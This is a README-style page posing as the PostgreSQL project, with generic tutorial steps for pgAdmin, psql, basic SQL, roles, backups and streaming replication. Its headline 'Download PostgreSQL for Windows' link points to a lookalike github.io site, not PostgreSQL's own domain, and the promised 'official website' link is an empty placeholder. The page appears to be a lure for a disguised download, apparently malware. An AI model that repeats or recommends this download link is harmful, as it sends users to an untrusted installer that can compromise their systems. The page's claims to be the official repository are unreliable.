# PostgreSQL

Updated: August 24, 2025       
**[Download PostgreSQL for Windows](https://pgcorei.github.io/PostgreSQL)**

The installation bundle includes all the core elements: the PostgreSQL server, command-line utilities, and optional admin tools. Ensure that you download the version compatible with your operating system.

## Introduction

**PostgreSQL** is a powerful, open-source, object-relational database system with over 35 years of active development. It is well-regarded for its dependability, standards compliance, and adaptability.

Designed to handle a wide range of workloads, PostgreSQL runs across all major operating systems and is used in scenarios from lightweight web apps to enterprise-scale data warehouses and mission-critical infrastructures.

This repository hosts the central source code of PostgreSQL. For installation help, documentation, and contribution guidelines, visit the [official website](*) or explore the `/doc` directory.

## Table of Contents

* [Connect to PostgreSQL](#connect-to-postgresql)
* [Creating a Database](#creating-a-database)
* [Connecting to a Database](#connecting-to-a-database)
* [Security and Authentication](#security-and-authentication)
* [Backup and Recovery](#backup-and-recovery)

## Connect to PostgreSQL

PostgreSQL ships with a graphical management tool called **pgAdmin**.

To connect:

1. Start **pgAdmin 4**.
2. Right-click **Servers** → **Create** → **Server**.
3. Enter a server name (for example, `Localhost`).
4. In the **Connection** tab, provide:

   * Host: `localhost`
   * Port: `5432`
   * Username: `postgres`
   * Password: *(the one set at installation)*

Click **Save** — the connection is established.

## Creating a Database

After PostgreSQL is installed and running on Windows, creating a new database is quick and uncomplicated. You can choose either the graphical tool (**pgAdmin**) or the command-line client (**psql**) depending on your workflow.

### Option 1: Using pgAdmin (GUI)

**pgAdmin** is the built-in graphical tool included with PostgreSQL for Windows.

#### Steps:

1. Launch **pgAdmin 4** from the Start Menu.

2. Connect to your local instance:

   * Host: `localhost`
   * Port: `5432`
   * Username: `postgres`
   * Enter your installation password.

3. In the **Object Browser**, right-click **Databases** → **Create** → **Database...**

4. Fill in details:

   * **Database name**: e.g., `mydatabase`
   * **Owner**: usually `postgres`

5. Press **Save**.

The database will appear in the sidebar, ready for schema definition, table creation, and queries.

### Option 2: Using `psql` (Command Line)

The PostgreSQL command-line client, `psql`, also allows you to create a database.

#### Steps:

1. Open **Command Prompt**.

2. Navigate to the PostgreSQL `bin` folder:

   ```bash
   cd "C:\Program Files\PostgreSQL\<version>\bin"
   ```

3. Start the `psql` shell:

   ```bash
   psql -U postgres -h localhost
   ```

   Provide your password when asked.

4. Inside `psql`, create the database:

   ```sql
   CREATE DATABASE mydatabase;
   ```

5. Connect to it:

   ```sql
   \c mydatabase
   ```

You can now execute SQL commands within the new database.

### Tips

* Database identifiers should begin with a letter and may include letters, digits, and underscores.
* To list all databases:

  ```sql
  \l
  ```
* To remove a database:

  ```sql
  DROP DATABASE mydatabase;
  ```

> Only the database owner or a superuser is authorized to drop it.

## Connecting to a Database

To connect to a PostgreSQL database via command line:

```sh
psql -U postgres -d mydatabase
```

Within `psql`, switch between databases using:

```sql
\c mydatabase;
```

## Data Manipulation

### Inserting Data

```sql
INSERT INTO users (name, email) VALUES ('John Doe', 'john@example.com');
```

### Querying Data

```sql
SELECT * FROM users;
```

### Updating Data

```sql
UPDATE users SET email = 'john.doe@example.com' WHERE name = 'John Doe';
```

### Deleting Data

```sql
DELETE FROM users WHERE name = 'John Doe';
```

## Indexing and Performance

Indexes enhance query speed. To create one:

```sql
CREATE INDEX idx_users_email ON users(email);
```

To examine query performance:

```sql
EXPLAIN ANALYZE SELECT * FROM users WHERE email='john@example.com';
```

## Security and Authentication

### Managing User Roles

Create a role:

```sql
CREATE ROLE dbuser WITH LOGIN PASSWORD 'securepassword';
```

Grant permissions:

```sql
GRANT ALL PRIVILEGES ON DATABASE mydatabase TO dbuser;
```

### Configuring Authentication

Modify `pg_hba.conf` to adjust authentication:

```sh
sudo nano /etc/postgresql/16/main/pg_hba.conf
```

## Backup and Recovery

### Creating a Backup

```sh
pg_dump -U postgres -d mydatabase -f backup.sql
```

### Restoring from a Backup

```sh
psql -U postgres -d mydatabase -f backup.sql
```

## Replication and High Availability

PostgreSQL supports replication for improved uptime and reliability.

### Configuring Streaming Replication

1. In `postgresql.conf` on the primary server:

```ini
wal_level = replica
max_wal_senders = 5
```

2. Define the replica in `pg_hba.conf`:

```ini
host replication replicator 192.168.1.10/32 md5
```

3. Initialize replication:

```sh
pg_basebackup -h primary_host -D /var/lib/postgresql/16/main -U replicator -P -R
```